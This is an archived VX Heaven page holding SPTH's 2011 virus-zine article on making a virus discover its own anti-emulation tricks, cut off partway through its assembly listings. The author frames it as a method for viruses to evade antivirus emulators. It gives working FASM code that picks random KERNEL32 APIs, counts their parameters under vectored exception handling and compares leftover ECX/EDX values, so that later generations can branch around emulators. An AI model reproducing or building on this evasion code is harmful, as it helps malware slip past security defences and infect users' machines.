<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Dynamic Anti-Emulation using Blackbox Analysis' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Dynamic Anti-Emulation using Blackbox Analysis, kernel, short, tricks, virus, version, random, push, dword, startcode, aslr, peter, ferrie, trick, parameters, emulated"/>
<meta name="Description" content="Viruses are threatened by Emulators. One can use Anti-Emulator tricks to avoid emulation, until AVs implement the new trick intro their program - so this benefit can not exceed a few hours?It can, if the virus can find and implement new Anti-Emulation tricks by itself. This text descibes how it can be done."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0be9870596f620f8eb704889b0474c18f4080f98-1498756135-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp42.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Dynamic Anti-Emulation using Blackbox Analysis</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=2008#f2008">Valhalla #2</a></em><br/> <em>October 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp42.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WI#vsp42">Back to index</a>] [<a href="/lib/vsp42.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">1) Introduction</a></li>
<li><a href="#c2">2) Idea</a></li>
<li><a href="#c3">3) Implementation</a>
<ul>
<li><a href="#c31">3.1) Finding a random API</a></li>
<li><a href="#c32">3.2) Getting number of API parameters</a></li>
<li><a href="#c33">3.3) Analysing the Black-Box API</a></li>
<li><a href="#c34">3.4) Creating Anti-Emulation Code</a></li>
<li><a href="#c35">3.5) Examples: Autonomous generated Anti-Emulation Tricks</a></li>
<li><a href="#c36">3.6) Working around ASLR</a></li>
</ul></li>
<li><a href="#c4">4) Possible extention: Remembering the tricks</a></li>
<li><a href="#c5">5) Thought experiment: Are we learning?</a></li>
<li><a href="#c6">6) Conclusion</a></li>
</ul>
<h2><a name="c1"></a>1) Introduction</h2>
<p>Viruses are threatened by Emulators. One can use Anti-Emulator tricks to avoid emulation, until AVs implement the new trick intro their program - so this benefit can not exceed a few hours?</p>
<p>It can, if the virus can find and implement new Anti-Emulation tricks by itself. This text descibes how it can be done.</p>
<h2><a name="c2"></a>2) Idea</h2>
<p>Standard Windows APIs use EAX, ECX, EDX as internal registers; after an API call, EAX contains the return value, and ECX &amp; EDX contain undocumented leftover values. Gabor Szappanos[1] and Peter Ferrie[2] show that these registers are used in Anti-Emulation tricks alot and AVs need to analyse and implement each new trick manually.</p>
<p>Now the idea is to find automatically such leftovers in random APIs, and implement a branch in the next generation. The viruscode will only be executed if the register values match with the original result.</p>
<p>If some emulators is not aware of the random API's undocumented leftover values, it will be fooled to exit the program. :-)</p>
<h2><a name="c3"></a>3) Implementation</h2>
<p>The basic concept is very simple:</p>
<ul>
<li>Search for a random API in a DLL (for instance KERNEL32.DLL)</li>
<li>Find out the number N of its paramaters (a.k.a PUSHes)</li>
<li>Prepare N random parameters</li>
<li>Call API with parameters</li>
<li>Save ECX &amp; EDX</li>
<li>Randomize Registers (leftovers can depend on that)</li>
<li>Call API again with same parameters</li>
<li>Compare ECX &amp; EDX</li>
<li>If equal, create Anti-Emulation Code + write it to next generation</li>
</ul>
<p>This is very simple, so just short explanation of some crucial parts.</p>
<h3><a name="c31"></a>3.1) Finding a random API</h3>
<p>First we need to find a random API. This can be very easy using ordinal numbers of DLL functions:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; kernel32&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Get Kernel32</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>LoadLibrary<span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetRandomNumber<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RandomNumber<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">0x400</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 0-1023</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RandOrdinal<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RandOrdinal<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>hKernel<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>GetProcAddress<span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; address of random API in EAX :)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #339933;">...</span><span style="color: black;">&#93;</span><br/>
<br/>
kernel32&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'kernel32.dll'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x0</span><br/>
&nbsp;</div>
<h3><a name="c32"></a>3.2) Getting number of API parameters</h3>
<p>Simple idea: push 16 DWORDs to the stack (no API has more parameters), save ESP, call the API, and compare ESP with old ESP:</p>
<pre>number(parameter) = (newESP-oldESP)/4</pre>
<p>Obviously, one can not call random APIs without exception handling. The easiest way is Vectorized Exception Handling, which is implemented as AddVectoredExceptionHandler and RemoveVectoredExceptionHandler:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; macro VEH_TRY c<span style="color: #339933;">*</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>sESP<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; VEH_Handler#c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0x1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>AddVectoredExceptionHandler<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>hVEH<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; macro VEH_EXCEPTION c<span style="color: #339933;">*</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>bException<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; VEH_NoException#c<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_Handler#c<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>sESP<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>bException<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; macro VEH_END c<span style="color: #339933;">*</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_NoException#c<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>hVEH<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RemoveVectoredExceptionHandler<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>s2ESP<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Save original ESP</span><br/>
<span style="color: #0000ff; font-weight: bold;">times</span> &nbsp; <span style="color: #ff0000;">0x10</span><span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; PUSH 16 parameters</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_TRY FirstRun<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFctAddress<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; try it ;)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_EXCEPTION FirstRun<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; no success :-/</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>s2ESP<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore ESP</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_END FirstRun<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>bException<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; SearchRandomAPI<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Get Number of arguments used by this random API :)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>sESP<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; eax/=4 -&gt; number of arguments</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFctArguments<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>s2ESP<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore ESP &nbsp; &nbsp; &nbsp;</span><br/>
&nbsp;</div>
<p>Number of arguments are in dword[RndFctArguments] now.</p>
<h3><a name="c33"></a>3.3) Analysing the Black-Box API</h3>
<p>What we want to do can be pictured:</p>
<pre>
                 _________
    random      |         |
    parameter   |         |
   -----------> |  ? ? ?  | \
                |         |  \
                |_________|   \
                               \
                                \
                                  ---> Same ECX &amp; EDX ?
    different registers         /
                 _________     /
    same        |         |   /
    parameter   |         |  /
   -----------> |  ? ? ?  | /
                |         |
                |_________|
</pre>
<p>We perform first API call with random parameters, then change registers and perform another API call with same parameters:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; RandomizeArguments<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; PushNArgumentsToStack<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_TRY RealRun1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFctAddress<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Call random API</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFct_RV_ECX<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save ECX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFct_RV_EDX<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save EDX</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_EXCEPTION RealRun1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>s2ESP<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore ESP</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;}</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_END RealRun1<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>bException<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; ThisIsNoGoodAPI<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Run again and compare ECX and EDX (Time-APIs and stuff like that,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; dependence on register values)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; PushNArgumentsToStack<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; VEH_TRY RealRun2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;{</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; RandomizeRegisters&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; change EAX, ECX, EDX, EBX to random value</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stdcall <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFctAddress<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; call random API again</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFct_RV_ECX<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ECX has to be the same, otherwise it cant be used</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; RealRun2ECX_OK<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if not the same:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; throw exception</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RealRun2ECX_OK<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span>RndFct_RV_EDX<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; EDX has to be the same as well</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; RealRun2EDX_OK<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RealRun2EDX_OK<span style="color: #339933;">:</span><br/>
